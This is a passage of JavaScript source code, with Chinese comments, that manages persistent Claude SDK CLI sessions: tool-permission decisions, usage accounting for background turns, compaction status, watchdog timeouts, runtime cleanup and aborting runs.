        : decision.cancelled ? 'cancelled' : (decision.allow ? 'answered_allow' : 'answered_deny'),
      sessionId: sid,
      provider: 'claude',
    }));

    if (!decision) return { behavior: 'deny', message: APPROVAL_UNANSWERED_MESSAGE };
    if (decision.cancelled) return { behavior: 'deny', message: 'Permission request cancelled' };
    if (decision.allow) {
      // 客户端给的条目先过服务端校验(见 rememberablePermissionEntry),不过的只放行这一次
      const remembered = rememberablePermissionEntry(decision.rememberEntry, { toolName, input, actorUsername: runtime.actorUsername });
      if (remembered) {
        if (!settings.allowedTools.includes(remembered)) {
          settings.allowedTools.push(remembered);
        }
        settings.disallowedTools = settings.disallowedTools.filter(entry => entry !== remembered);
      }
      return { behavior: 'allow', updatedInput: decision.updatedInput ?? input };
    }
    return { behavior: 'deny', message: decision.message ?? 'User denied tool use' };
  };

  return sdkOptions;
}

/**
 * CLI 自己发起的回合(后台任务回报、会话内定时、成了独立一轮的插话)的用量。
 *
 * 这些帧走无主路径,不经过 Prism 的回合;不记的话 `/cost` 与按人 / 按项目的统计系统性少记,后台任务用得越多
 * 少记越多。没有用户回合时逐帧累加到 runtime.orphanUsage,遇到那一轮的 result 记一条 `source: 'background'`
 * 的账(见 recordOrphanUsage)。
 */
function noteOrphanUsage(runtime, message) {
  if (!runtime.orphanUsage) runtime.orphanUsage = createUsageAccumulator();
  if (!runtime.orphanUsageStartedAt && isContentfulFrame(message) && !isTurnResult(message)) {
    runtime.orphanUsageStartedAt = Date.now();
  }
  accumulateUsage(runtime.orphanUsage, message);
  if (isTurnResult(message)) recordOrphanUsage(runtime, message);
}

/**
 * CLI 自己那一轮的 result 到了:按 result 上这一轮的汇总记账,然后清零。
 *
 * 那一轮的 result 也可能在用户回合里到达(被读循环判成外来的 result),同样走这里。账记在 runtime 当前的
 * 主人名下(最后一次被接受的发送者)。没有任何 token 的 result(多个后台任务完成时的空 result)不单记一行:
 * 台账按会话累计费用求差,它的费用增量会并进这段对话的下一条账里。
 */
function recordOrphanUsage(runtime, resultMessage) {
  const accumulator = runtime.orphanUsage ?? createUsageAccumulator();
  const startedAt = runtime.orphanUsageStartedAt ?? null;
  runtime.orphanUsage = createUsageAccumulator();
  runtime.orphanUsageStartedAt = null;
  mergeResultUsage(accumulator, resultMessage);
  const tokens = accumulator.inputTokens + accumulator.outputTokens
    + accumulator.cacheReadTokens + accumulator.cacheCreationTokens;
  if (tokens <= 0) return;
  recordTurnUsage(accumulator, resultMessage, {
    // 与用户回合同一个口径:落 app 会话 id(见读循环里 recordTurnUsage 那段)
    sessionId: runtime.appSessionId || runtime.sessionId || null,
    projectPath: runtime.projectPath ?? null,
    userId: runtime.ownerUserId ?? null,
    username: runtime.actorUsername ?? null,
    model: runtime.currentModel ?? null,
    source: 'background',
    durationMs: startedAt ? Date.now() - startedAt : null,
  });
}

/**
 * The shared reader: consumes the resident query's event stream for the whole
 * conversation, routing each event to whichever turn is currently active.
 */
async function readPersistentRuntime(runtime) {
  try {
    for await (const message of runtime.query) {
      // runtime 被换掉(dispose+resume)后,缓冲里残余的帧不再转发,否则会灌进新回合。
      if (runtime.disposed) break;
      runtime.lastUsed = Date.now();

      // Capture / track the provider-native session id.
      if (message.session_id && runtime.sessionId !== message.session_id) {
        runtime.sessionId = message.session_id;
        rekeyRuntime(runtime);
      }
      // 记下 CLI 版本(据此判断 result 会不会回显 uuid)并打一行启动摘要。
      noteCliInit(runtime, message, `Runtime ${runtime.key}`);

      // 在途工具集合挂在 runtime 上(不挂在 turn 上),而且先记账、再判有没有回合。
      //
      // 回合可能先于工具结束(中止 / 看门狗 / 报错),此时 CLI 那边的 Bash 还在跑:只看 runtime.turn
      // 会以为会话闲了,往一个还在忙的 CLI 里推下一条消息;没有回合时迟到的 tool_result 也必须照样记账,
      // 否则集合永远清不空,前端那张卡片一直停在"运行中"。
      const toolDelta = collectToolUseDelta(message);
      for (const id of toolDelta.adds) runtime.pendingToolUses.add(id);
      for (const id of toolDelta.removes) runtime.pendingToolUses.delete(id);
      // 子代理内部的在途工具另记一张(见 collectToolUseDelta 的说明)。
      const subagentDelta = collectSubagentToolUseDelta(message);
      if (!(runtime.subagentToolUses instanceof Map)) runtime.subagentToolUses = new Map();
      for (const { id, parent } of subagentDelta.adds) runtime.subagentToolUses.set(id, parent);
      for (const id of subagentDelta.removes) runtime.subagentToolUses.delete(id);
      // 父任务收工:顶层 tool_result 到了 → 它名下的子代理在途一并清掉
      for (const parentId of toolDelta.removes) settleSubagentTools(runtime, parentId);
      if (message?.type === 'system' && message?.subtype === 'task_notification' && message.tool_use_id) {
        settleSubagentTools(runtime, message.tool_use_id);
      }
      // result 的 modelUsage 是累计的:记下这一轮之前的底数,健康度按差值认模型
      noteResultModelUsage(runtime, message);
      // 停止时被 CLI 转成后台的前台命令 → 停掉
      stopInterruptBackgroundedTask(runtime, message);
      // 后台任务全量表
      noteBackgroundTasks(runtime, message);
      // 这一帧是不是在回答我们合流进去的消息(要在 noteMergedDelivered 清账之前判)
      const answersMerged = frameAnswersMerged(runtime, message);
      noteMergedDelivered(runtime, message);

      const turn = runtime.turn;
      if (!turn) {
        if (toolDelta.removes.length > 0 && runtime.pendingToolUses.size === 0) {
          log.info(`[Claude SDK] Runtime ${runtime.key} drained its pending tools after the turn ended; reusable again`);
        }
        /**
         * 没有用户回合的帧交给观测回合(见 routeOrphanMessage / observed-run.service)。
         *
         * 这里不只有两轮之间迟到的残余帧,还有 CLI 自己发起的一整轮(后台子代理完成通知、会话内定时任务触发):
         * 注入帧、模型的回复、工具帧、result。直接丢掉的话当场看不到(不广播),刷新也看不到
         * (不落显示日志,而 seed 只在日志为空时抄一次)。这一轮花的钱照样记账(noteOrphanUsage)。
         */
        noteOrphanUsage(runtime, message);
        routeOrphanMessage(runtime, message, { answersMerged });
        continue;
      }

      /**
       * CLI 自己那一轮的 result 不算用户回合的结束。
       *
       * `runPersistentTurn` 知道 CLI 可能正跑着它自己发起的一轮(后台任务通知),仍以 `priority:'now'`
       * 把用户消息推进去。若 CLI 先把自己那轮跑完,它的 result 会在这里 resolve 用户的 turn:发 complete、
       * 把 CLI 那轮的用量记在用户名下,用户真正的回答随后成了无主帧。
       *
       * 判据:先按 uuid 回显判归属(classifyTurnResult);判不出来时,push 时 CLI 的一轮开着
       * (turn.expectForeignResult)且这条 result 到达前本回合还没收到过任何一帧,就只能是 CLI 自己那轮的收尾。
       */
      if (isTurnResult(message)) {
        // 先按 uuid 判归属;判不出来(unknown)再用"还没收到过帧"的判据。
        const attribution = classifyTurnResult(turn, message, {
          uuidEcho: cliEchoesUserMessageUuid(runtime.cliVersion),
        });
        if (attribution === 'foreign' || (attribution === 'unknown' && shouldIgnoreForeignResult(turn))) {
          turn.expectForeignResult = false;
          runtime.orphanTurnOpen = false;
          log.info(
            `[Claude SDK] Runtime ${runtime.key}:忽略不属于本回合的 result`
            + `(${attribution === 'foreign' ? `uuid 不符 / 空结果 num_turns=${message.num_turns ?? '?'}` : 'CLI 自己那一轮'}),用户回合继续`
          );
          // 它是 CLI 自己那一轮的收尾,那一轮的用量照样入账
          recordOrphanUsage(runtime, message);
          touchTurnActivity(runtime, turn);
          continue;
        }
      } else {
        turn.sawFrame = true;
      }

      /**
       * SDK 的任务生命周期帧回合内也会来:
       * 前台起的后台任务(Ctrl+B 转后台的 Bash、workflow)就在这一轮里报 `task_started`。
       */
      const taskRowInTurn = taskLifecycleMessage(message, runtime.sessionId || null);
      if (taskRowInTurn) {
        touchTurnActivity(runtime, turn);
        turn.ws.send(taskRowInTurn);
        continue;
      }

      // 活跃度看门狗:任何流事件都算"活着",刷时间戳并续期。
      touchTurnActivity(runtime, turn);
      // 同一个"还活着"的事实,也送一份给界面(压缩中才发,按间隔节流)。
      beatCompaction(runtime, turn);

      if (message.session_id && !turn.capturedSessionId) {
        turn.capturedSessionId = message.session_id;
        addSession(turn.capturedSessionId, runtime.query, turn.ws, runtime.abortController);
        if (turn.ws.setSessionId && typeof turn.ws.setSessionId === 'function') {
          turn.ws.setSessionId(turn.capturedSessionId);
        }
        if (turn.isNewSession && !turn.sessionCreatedSent) {
          turn.sessionCreatedSent = true;
          turn.ws.send(createNormalizedMessage({ kind: 'session_created', newSessionId: turn.capturedSessionId, sessionId: turn.capturedSessionId, provider: 'claude' }));
        }
      }

      /**
       * 网关重试看得见:网关 429 / 5xx / 断流时 CLI 在退避重试(`system/api_retry`),活动指示器上写
       * "网关繁忙,第 2/10 次重试,8 秒后";下一帧正常内容到了就清掉。
       * `informational`(warning / suggestion 级)是 CLI 的提醒(Stop hook 拦下、再压一次等),弹一句给用户。
       */
      const retryStatus = apiRetryStatusFrame(message, turn.capturedSessionId || runtime.sessionId || null);
      if (retryStatus) {
        turn.apiRetrying = true;
        turn.ws.send(retryStatus);
        continue;
      }
      if (turn.apiRetrying && isContentfulFrame(message)) {
        turn.apiRetrying = false;
        turn.ws.send(createNormalizedMessage({ kind: 'status', statusClear: true, sessionId: turn.capturedSessionId || runtime.sessionId || null, provider: 'claude' }));
      }
      const notice = cliNoticeFrame(message, turn.capturedSessionId || runtime.sessionId || null);
      if (notice) {
        turn.ws.send(notice);
        continue;
      }

      /**
       * CLI 自己报的压缩状态:它明说了压缩什么时候开始、什么时候结束、成还是败,比任何推断都准。
       */
      if (message.type === 'system' && message.subtype === 'status') {
        if (message.status === 'compacting') {
          // 回合中途 CLI 自己压 = 用户正等着它,blocking。
          beginCompaction(runtime, turn, { trigger: 'auto', blocking: true });
        }
        if (message.compact_result) {
          endCompaction(runtime, turn, {
            ok: message.compact_result === 'success',
            error: message.compact_error || null,
          });
        } else if (message.status === null && turn.compaction) {
          /**
           * PreCompact hook 拦下压缩时,CLI 只发 `status: null`、不带 `compact_result`。不收尾的话压缩态
           * 一直亮到回合结束,剩余回合都按压缩上限走。按"取消"收尾(classifyCompactError → skipped,不报失败)。
           */
          endCompaction(runtime, turn, { ok: false, error: 'Compaction canceled' });
        }
      }

      /**
       * 压缩边界。`compact_metadata` 里有 pre/post token 与耗时,是"压缩到底做成了什么"的唯一硬数据。
       */
      if (message.type === 'system' && message.subtype === 'compact_boundary') {
        const meta = message.compact_metadata || {};
        runtime.compactedSinceUsageRead = true;
        /**
         * 边界帧 = 压缩已经完成。CLI 通常先发 `status{compact_result:'success'}` 再发边界帧,那时本回合的
         * 压缩已经收尾;再 begin 会把压缩态重新点亮、一直亮到回合结束,剩余回合被按压缩上限计时。
         * 所以本回合已收过尾就不再 begin;还亮着(或完全没有 status 帧)就补元数据并立即收尾。
         */
        // "收过尾、还欠一帧边界"只对紧挨着的那次压缩成立;消费掉就清,
        // 同一回合里后面再有一次只带边界帧的压缩照常 begin → end。
        const alreadyEnded = !turn.compaction && Boolean(turn.compactionAwaitingBoundary);
        turn.compactionAwaitingBoundary = false;
        if (!alreadyEnded) {
          beginCompaction(runtime, turn, {
            trigger: meta.trigger === 'manual' ? 'manual' : 'auto',
            blocking: true,
          });
        }
        if (turn.compaction) {
          // status 帧先到时只能标 auto;边界元数据才知道是不是用户手打的。
          if (meta.trigger === 'manual' && turn.compaction.trigger === 'auto') {
            turn.compaction.trigger = 'manual';
          }
          turn.compaction.preTokens = readNumber(meta.pre_tokens) || turn.compaction.preTokens || null;
          const post = readNumber(meta.post_tokens);
          if (post) turn.compaction.postTokens = post;
          const duration = readNumber(meta.duration_ms);
          if (duration) turn.compaction.durationMs = duration;
          // 边界帧就是完成信号:立即收尾,静默看门狗回到用户回合预算。
          endCompaction(runtime, turn, { ok: true });
          turn.compactionAwaitingBoundary = false;
        }
        /*
         * 压缩的硬数据落一行日志:从多少压到多少、跑了多久,排查时不用拿前后两条日志的时间戳去减。
         */
        const pre = readNumber(meta.pre_tokens);
        const post = readNumber(meta.post_tokens);
        const ms = readNumber(meta.duration_ms);
        log.info(
          `[Claude SDK] 压缩 runtime=${runtime.key} trigger=${meta.trigger === 'manual' ? 'manual' : 'auto'}`
          + ` tokens=${pre ?? '?'}→${post ?? '?'}`
          + `${pre && post ? `(-${Math.round((1 - post / pre) * 100)}%)` : ''}`
          + ` 耗时=${ms ? `${Math.round(ms / 1000)}s` : '?'}`
        );
      }

      const transformedMessage = transformMessage(message);
      const sid = runtime.sessionId || null;
      const normalized = sessionsService.normalizeMessage('claude', transformedMessage, sid);
      for (const msg of normalized) {
        if (transformedMessage.parentToolUseId && !msg.parentToolUseId) {
          msg.parentToolUseId = transformedMessage.parentToolUseId;
        }
        turn.streamed = true;
        turn.ws.send(msg);
      }

      /**
       * 子代理的帧不刷主上下文环。它们带着自己那一小段对话的 usage,不过滤的话主代理 120k 的环
       * 会被子代理 8k 的 usage 盖一下、下一帧再跳回来,整个子代理运行期间一直闪。
       * 记账(accumulateUsage)照旧:那是真花的钱。
       */
      const tokenBudgetData = message?.parent_tool_use_id ? null : extractTokenBudget(message, runtime);
      if (tokenBudgetData) {
        turn.ws.send(createNormalizedMessage({ kind: 'status', text: 'token_budget', tokenBudget: tokenBudgetData, sessionId: sid, provider: 'claude' }));
      }

      // 逐条累加(含 CLI 在回合内自动压缩那几次调用:压缩也是真花钱的)。
      accumulateUsage(turn.usage, message);

      if (isTurnResult(message)) {
        // 任何顶层 result 过了这里,CLI 那边就没有"开着的一轮"了。不清的话这个位会卡在 true,
        // 让下一次用户回合误把自己的 result 当外来的(回合挂到看门狗)。
        runtime.orphanTurnOpen = false;
        recordTurnUsage(turn.usage, message, {
          /**
           * 落 app 会话 id,不是 provider 原生 id。
           *
           * `/cost` 那一行台账查的是 `totalsForSession(context.sessionId)`,而 `context.sessionId` 来自前端的
           * `currentSessionId`:前端只认识 app 会话 id(`session_created` 帧被 writer 整个吞掉,原生 id 到不了浏览器)。
           * 网页新建的会话 `provider_session_id` 先是 NULL、之后由 CLI 生成一个 uuid 补上,两个 id 必然不同,
           * 落原生 id 的话网页会话的台账累计永远查不到。
           */
          sessionId: runtime.appSessionId || runtime.sessionId || turn.capturedSessionId || null,
          projectPath: runtime.projectPath ?? null,
          userId: runtime.ownerUserId ?? null,
          username: runtime.actorUsername ?? null,
          model: runtime.currentModel ?? null,
          // 压缩归 CLI、发生在用户回合内部,常驻路径的账一律记 chat。
          source: 'chat',
          durationMs: Date.now() - turn.startedAtMs,
        });
        finishPersistentTurn(runtime, { resultMessage: message });
      }
    }
    failActiveTurn(runtime, describeForUser(
      new Error('Claude SDK runtime ended unexpectedly'),
      'RUNTIME_GONE',
      '这段对话的 CLI 进程意外退出了,这一轮没有跑完。直接再发一条即可接着聊(会自动重新接上这段对话)。',
    ));
  } catch (error) {
    failActiveTurn(runtime, error);
    if (!runtime.disposed) {
      // 带上 CLI 的 stderr —— 子进程起不来时,退出码本身说明不了任何问题。
      log.error(
        `[Claude SDK] Persistent runtime ${runtime.key} failed:`,
        runtime.stderrTail ? runtime.stderrTail.describe(error) : (error?.message || error),
      );
    }
  } finally {
    if (claudeRuntimes.get(runtime.key) === runtime) claudeRuntimes.delete(runtime.key);
    runtime.input.close();
    // 进程自己退出 / 硬中止升级时不走 disposePersistentRuntime(它见 disposed 就直接返回),
    // dispose 的善后在这里也做一遍(finalizeRuntime 幂等,dispose 做过的不再做);
    // 后台任务条与合流消息同样要收,不然面板一直挂着"N 个后台任务"、插话一直显示"可撤回"
    finalizeRuntime(runtime);
    releaseRuntimeSideState(runtime, 'process_ended');
    runtime.disposed = true;
    // 进程自己退出时同样删掉带 key 的 flag 设置文件
    removeFlagSettingsFile(runtime.flagSettingsFile);
    runtime.flagSettingsFile = null;
  }
}

/**
 * 进程没了,挂在它身上的东西一起收尾(dispose 与读循环结束两处共用,幂等):
 * - 后台任务全没了 → 面板清空(不清会一直挂着"2 个后台任务",点停止只会回 not_resident);
 * - 账上还挂着的插话 → 报"撤不回了"(delivered,只收起「撤回」),不报"已撤回":账上剩下的多半是
 *   送到了但没回显的(CLI 版本不回显 uuid,或被打断的那一轮没回显),标成"模型没有执行"是说错话;
 *   真没送到的那种(进程崩在它排队时)极少,宁可不说。
 */
export function releaseRuntimeSideState(runtime, reason) {
  if ((runtime?.liveBackgroundTasks?.size ?? 0) > 0) {
    runtime.liveBackgroundTasks = new Map();
    if (backgroundTasksHook && runtime.appSessionId) {
      try { backgroundTasksHook({ appSessionId: runtime.appSessionId, tasks: [], reason }); } catch { /* best effort */ }
    }
  }
  const pendingMerged = runtime?.mergedUuids instanceof Map ? [...runtime.mergedUuids.keys()] : [];
  if (pendingMerged.length > 0) emitMergedEvent(runtime, 'delivered', pendingMerged, reason);
  runtime?.mergedUuids?.clear?.();
}

function rekeyRuntime(runtime) {
  if (!runtime.sessionId || runtime.key === runtime.sessionId) return;
  if (claudeRuntimes.get(runtime.key) === runtime) {
    claudeRuntimes.delete(runtime.key);
  }
  runtime.key = runtime.sessionId;
  claudeRuntimes.set(runtime.key, runtime);
}

/** 清掉一个 turn 的全部看门狗计时器。 */
function clearTurnTimers(turn) {
  if (turn.idleTimer) clearTimeout(turn.idleTimer);
  if (turn.absoluteTimer) clearTimeout(turn.absoluteTimer);
  turn.idleTimer = null;
  turn.absoluteTimer = null;
}

/** 给人看的时长:整小时说「N 小时」,一分钟以上说「N 分钟」,再短说「N 秒」。 */
function describeDuration(ms) {
  const seconds = Math.max(1, Math.round(ms / 1000));
  if (seconds % 3600 === 0) return `${seconds / 3600} 小时`;
  if (seconds >= 60) return `${Math.round(seconds / 60)} 分钟`;
  return `${seconds} 秒`;
}

/**
 * 看门狗触发:回合报错、中止子进程、重建 runtime(下一条消息自动续聊)。
 * `messageText` 是进日志的英文原文,`userMessage` 是发进聊天的中文说明(见 describeForUser)。
 */
function fireTurnTimeout(runtime, turn, messageText, code, userMessage) {
  const timeoutError = describeForUser(new Error(messageText), code, userMessage);
  timeoutError.prismTurnTimeout = true;
  log.error(`[Claude SDK] Turn watchdog fired for runtime ${runtime.key}: ${timeoutError.message}`);
  failActiveTurn(runtime, timeoutError);
  try {
    runtime.abortController?.abort();
  } catch { /* best effort */ }
  disposePersistentRuntime(runtime).catch(() => {});
}

/**
 * 流上有动静:刷新活跃时间戳并重新武装静默看门狗。只有真实事件才走这里 ——
 * 看门狗自己的续期(armIdleWatchdog)不刷时间戳,否则工具在途硬顶永远测不满。
 */
function touchTurnActivity(runtime, turn) {
  turn.lastStreamActivityAt = Date.now();
  armIdleWatchdog(runtime, turn);
}

/**
 * (重新)武装静默看门狗。到点时:工具在途 → 通常只续期不杀(长 SQL/长构建期间
 * 流上本来就没输出,CLI 的工具超时机制负责那一层),但静默超过 toolSilenceMax
 * (默认 24h)也判死 —— 兜住被遗忘的审批和丢失的 tool_result,不让 runtime
 * 名额被永久钉住;无工具在途且静默超阈 → 判死。
 */
function armIdleWatchdog(runtime, turn) {
  const budget = turn.watchdog || TURN_WATCHDOG;
  // 压缩进行中用压缩阶段自己的静默上限(取两者较小;用户回合的 idle 关着时也照样用压缩上限)。
  // 压缩帧一到就会重新武装回用户预算。
  const compacting = Boolean(turn.compaction) && COMPACTION_IDLE_TIMEOUT_MS > 0;
  const idleMs = compacting
    ? (budget.idleMs > 0 ? Math.min(budget.idleMs, COMPACTION_IDLE_TIMEOUT_MS) : COMPACTION_IDLE_TIMEOUT_MS)
    : budget.idleMs;
  if (turn.idleTimer) clearTimeout(turn.idleTimer);
  turn.idleTimer = null;
  if (idleMs <= 0) return;
  turn.idleTimer = setTimeout(() => {
    if (runtime.turn !== turn) return; // result arrived in the meantime
    // 在途工具挂在 runtime 上(见读循环里的说明),这里跟着读那一份。
    if (runtime.pendingToolUses.size > 0) {
      const silenceMs = Date.now() - (turn.lastStreamActivityAt || Date.now());
      if (budget.toolSilenceMaxMs > 0 && silenceMs >= budget.toolSilenceMaxMs) {
        fireTurnTimeout(runtime, turn,
          `Claude turn had a tool call pending with no activity for ${Math.round(silenceMs / 3600000)}h (abandoned approval or lost tool result); the session runtime was restarted`,
          'TOOL_SILENCE_TIMEOUT',
          `这一轮有一个工具调用超过 ${describeDuration(budget.toolSilenceMaxMs)}没有结果(审批没人回答,或工具结果丢了),`
          + '已结束这一轮并重启这段对话的 CLI。直接再发一条即可接着聊。');
        return;
      }
      armIdleWatchdog(runtime, turn);
      return;
    }
    if (compacting) {
      fireTurnTimeout(runtime, turn,
        `Claude context compaction produced no output for ${Math.round(idleMs / 1000)}s; the session runtime was restarted (the next message continues with the uncompacted context)`,
        'COMPACTION_TIMEOUT',
        `压缩上下文超过 ${describeDuration(idleMs)}没有完成,已结束这一轮并重启这段对话的 CLI(上下文没有压缩)。直接再发一条即可接着聊。`);
      return;
    }
    fireTurnTimeout(runtime, turn,
      `Claude turn produced no output for ${Math.round(idleMs / 1000)}s; the session runtime was restarted`,
      'TURN_IDLE_TIMEOUT',
      `这一轮超过 ${describeDuration(idleMs)}没有任何输出,已结束这一轮并重启这段对话的 CLI。直接再发一条即可接着聊。`);
  }, idleMs);
  turn.idleTimer.unref?.();
}

function finishPersistentTurn(runtime, { resultMessage }) {
  const turn = runtime.turn;
  if (!turn) return;
  // CLI 不一定每次都补一帧 compact_result;回合正常结束就按成功收尾,
  // 否则界面会停在"正在压缩"上,而压缩其实早就完了。
  endCompaction(runtime, turn, { ok: true });
  runtime.turn = null;
  runtime.lastUsed = Date.now();
  clearTurnTimers(turn);
  if (turn.capturedSessionId) removeSession(turn.capturedSessionId);
  turn.resolve({ resultMessage, sessionId: runtime.sessionId || turn.capturedSessionId || null });
}

function failActiveTurn(runtime, error) {
  const turn = runtime.turn;
  if (!turn) return;
  endCompaction(runtime, turn, { ok: false, error: error?.message || null });
  runtime.turn = null;
  clearTurnTimers(turn);
  // 回合已经没人在等,挂在这段对话上的待批请求也就没有消费者了:不清扫的话会变成反复弹出、
  // 又点不动的幽灵确认框。
  // 带着在途工具异常收尾,说明我们对这个 CLI 的认知已不可信(它还在跑东西,Prism 却不再跟踪):
  // 标成 suspect,runtimeForSend 会换新,并在日志里留一句。
  cancelPendingApprovalsForSession(runtime.appSessionId, 'cancelled');
  if (runtime.pendingToolUses.size > 0 && !runtime.suspect) {
    runtime.suspect = true;
    log.warn(
      `[Claude SDK] Runtime ${runtime.key} marked suspect: turn ended with `
      + `${runtime.pendingToolUses.size} tool call(s) still in flight (${error?.message || 'unknown reason'})`
    );
  }
  if (turn.capturedSessionId) removeSession(turn.capturedSessionId);
  // Mark whether the client already saw partial output for this turn — the
  // dispatcher only replays the turn on the one-shot path when nothing
  // streamed yet (a replay after partial output would duplicate content).
  if (error && typeof error === 'object') {
    error.prismStreamed = Boolean(turn.streamed);
    // 输入是否已递交 + 回合起点。分发器用它们判断"重放会不会造出重复的
    // 用户消息"(递交之后 CLI 可能已把消息写进 transcript)。
    error.prismInputDelivered = Boolean(turn.inputDelivered);
    error.prismTurnStartedAtMs = turn.startedAtMs || null;
    // 子进程的 stderr 跟着错误一起往上走 —— 分发器那边会把它拼进用户看到的
    // 那条 error 里,否则用户只拿到一个退出码。
    const tail = runtime.stderrTail?.text();
    if (tail) error.prismStderr = tail;
  }
  turn.reject(error);
}

/**
 * runtime 被丢弃时通知组合根(目前接的是观测回合的清账 `forgetObservedRun`)。
 * 与 setOrphanTurnHook 同一套写法:claude-sdk 不认识 websocket 层。
 */
let runtimeDisposedHook = null;
export function setRuntimeDisposedHook(hook) {
  runtimeDisposedHook = typeof hook === 'function' ? hook : null;
}

/**
 * runtime 丢掉时记下它最后的模型 / 窗口 / 用量(按 provider 会话 id),给切模型的压缩线判断用
 * (见 runtimeForSend 里 guardSubject)。只在进程内,有上限,最旧的先丢。
 */
const lastRuntimeContextBySession = new Map();
const LAST_RUNTIME_CONTEXT_LIMIT = 500;
function rememberRuntimeContext(runtime) {
  const sessionId = runtime?.sessionId;
  if (!sessionId || !runtime.lastContextUsage) return;
  lastRuntimeContextBySession.delete(sessionId);
  lastRuntimeContextBySession.set(sessionId, {
    currentModel: runtime.currentModel ?? null,
    contextWindow: runtime.contextWindow ?? null,
    lastContextUsage: runtime.lastContextUsage,
  });
  while (lastRuntimeContextBySession.size > LAST_RUNTIME_CONTEXT_LIMIT) {
    lastRuntimeContextBySession.delete(lastRuntimeContextBySession.keys().next().value);
  }
}

/**
 * 进程没了之后对外的善后。dispose 与读循环收尾(进程自己退出、硬中止)两处都调,只做一次:
 * - 记下它最后的模型 / 窗口 / 用量(rememberRuntimeContext);
 * - 通知组合根(观测回合就地收尾):不通知的话,CLI 在两轮之间自己退出时观测回合若停在「工具在途」,
 *   看门狗只续不杀,界面最长转圈两个多小时;
 * - 清掉挂在这段对话上的待批审批:没有活跃回合时 failActiveTurn 不会清,进程都没了,它们不可能再有人消费,
 *   留着会在每次订阅时补发一张点不动的确认框。
 */
function finalizeRuntime(runtime) {
  if (!runtime || runtime.finalized) return;
  runtime.finalized = true;
  rememberRuntimeContext(runtime);
  if (runtimeDisposedHook && runtime.appSessionId) {
    try {
      runtimeDisposedHook(runtime.appSessionId);
    } catch (error) {
      log.warn('[Claude SDK] runtime 丢弃的善后钩子失败:', error?.message || error);
    }
  }
  cancelPendingApprovalsForSession(runtime.appSessionId, 'cancelled');
}

async function disposePersistentRuntime(runtime) {
  if (!runtime || runtime.disposed) return;
  runtime.disposed = true;
  failActiveTurn(runtime, describeForUser(
    new Error('Claude SDK runtime disposed'),
    'RUNTIME_DISPOSED',
    '这段对话的 CLI 进程被关掉了,这一轮没有跑完。直接再发一条即可接着聊。',
  ));
  // 记住用量、通知组合根、清待批;在关进程之前做完,读循环收尾时就不会再做一遍
  finalizeRuntime(runtime);
  // 进程还活着:账上还挂着的插话先试着撤一下(最多等 0.8 秒),撤到 = 真没跑过,报"已撤回";
  // 撤不到的才交给 releaseRuntimeSideState 按"撤不回了"收起(看门狗回收卡住的回合时,排着的那条多半真没跑)
  if ((runtime.mergedUuids?.size ?? 0) > 0) {
    let raceTimer = null;
    await Promise.race([
      withdrawMergedBeforeInterrupt(runtime, runtime.query, 'disposed').catch(() => []),
      new Promise((resolve) => { raceTimer = setTimeout(resolve, 800); }),
    ]);
    if (raceTimer) clearTimeout(raceTimer);
  }
  releaseRuntimeSideState(runtime, 'disposed');
  runtime.input.close();
  try {
    if (typeof runtime.query?.close === 'function') runtime.query.close();
    else runtime.abortController?.abort();
  } catch (error) {
    log.warn(`[Claude SDK] Runtime close failed:`, error?.message || error);
  }
  if (claudeRuntimes.get(runtime.key) === runtime) claudeRuntimes.delete(runtime.key);
  // 删掉带 key 的 flag 设置文件(进程已经关了)
  removeFlagSettingsFile(runtime.flagSettingsFile);
  runtime.flagSettingsFile = null;
}

/** 按 app 会话 id 找常驻 runtime(观测回合没有 activeChatRuns 登记,只能这么找)。 */
function findRuntimeByAppSessionId(appSessionId) {
  if (!appSessionId) return null;
  for (const runtime of claudeRuntimes.values()) {
    if (!runtime.disposed && runtime.appSessionId === appSessionId) return runtime;
  }
  return null;
}

/**
 * Aborts the live chat run registered under a gateway runId.
 *
 * Unlike `abortClaudeSDKSession` this works BEFORE the provider-native session
 * id exists (the first turn of a brand-new conversation only learns its id
 * mid-stream), so the stop button is never a no-op. The interrupted turn's
 * result event clears `runtime.turn` via the shared reader, leaving the
 * runtime reusable; if the interrupt itself fails, the runtime is disposed so
 * nothing stays stuck in "running".
 * @param {string} runId - Gateway run identifier (app session id)
 * @returns {Promise<boolean>} True when an abort was delivered or recorded
 */
async function abortClaudeSDKRun(runId) {
  const entry = runId ? activeChatRuns.get(runId) : null;
  if (!entry) {
    /**
     * 「停止」也要能停掉 CLI 自己发起的那一轮。
     *
     * 观测回合不经过 runPersistentTurn,`activeChatRuns` 里没有它,两轮之间 `activeSessions` 里也没有;
     * 不在这里处理的话,停止按钮两条路都返回 false,websocket 层却照样把观测回合标成完成,
     * CLI 继续跑,后面那批帧被观测回合丢掉。所以按 app 会话 id 找到 runtime,直接 interrupt。
     */
    const runtime = findRuntimeByAppSessionId(runId);
    if (!runtime || runtime.turn) return false;
    return interruptCliOwnTurn(runtime, runId);
  }
  // 停止标记在第一个 await 之前记下:chat 层发起中止之后紧接着按"这一条不会再开跑"处理(见 handleChatAbort)
  entry.aborted = true;

  const runtime = entry.runtime;
  const sessionId = runtime?.sessionId || runtime?.turn?.capturedSessionId || null;
  // Mirror abortClaudeSDKSession: the abort handler owns the terminal
  // `complete`, so the run loop must not emit its own.
  if (sessionId) abortedSessionIds.add(sessionId);

  /**
   * 回合之间的停止不碰 runtime 的 abortController:它管的是整个常驻 CLI,abort 等于连同进程里的后台子代理、
   * 后台命令一起杀掉。这段时间里要停的东西各有各的手柄:
   * - /loop 两轮之间的验证命令有自己的中止手柄(runEntry.loopAbortController),停它就够了;
   * - 回合还没开跑(排队等 runtime、等上一轮收尾或 CLI 自己那一轮跑完、带图消息在构造内容):上面已记下 aborted,
   *   开跑前会看到它早退(runtimeForSend 里那两段等待、queryClaudeSDKPersistent 的 wasRunAborted、
   *   runPersistentTurn 的 abortCheck、/loop 每轮开跑前的检查);
   * - 回合已出 result、complete 还没发:这一轮已经结束,没有要停的。
   */
  if (entry.loopAbortController) {
    log.info(`[Claude SDK] Aborting run ${runId}: stopping the loop's verification command`);
    try { entry.loopAbortController.abort(); } catch { /* best effort */ }
  }

  try {
    if (runtime && !runtime.disposed && runtime.turn) {
      log.info(`[Claude SDK] Aborting run ${runId} via runtime interrupt`);
      // 收尾那几秒里新来的话不再合流进这一轮(见 mergeRefusalReason 的 turn-stopping)
      runtime.turn.stopping = true;
      disarmForeignResultGuard(runtime);
      await interruptRuntime(runtime, runtime.query, `run ${runId} (runtime)`);
      return true;
    }
    if (entry.queryInstance) {
      log.info(`[Claude SDK] Aborting run ${runId} via one-shot interrupt`);
      await interruptWithTimeout(entry.queryInstance, `run ${runId} (one-shot)`);
      return true;
    }
  } catch (error) {
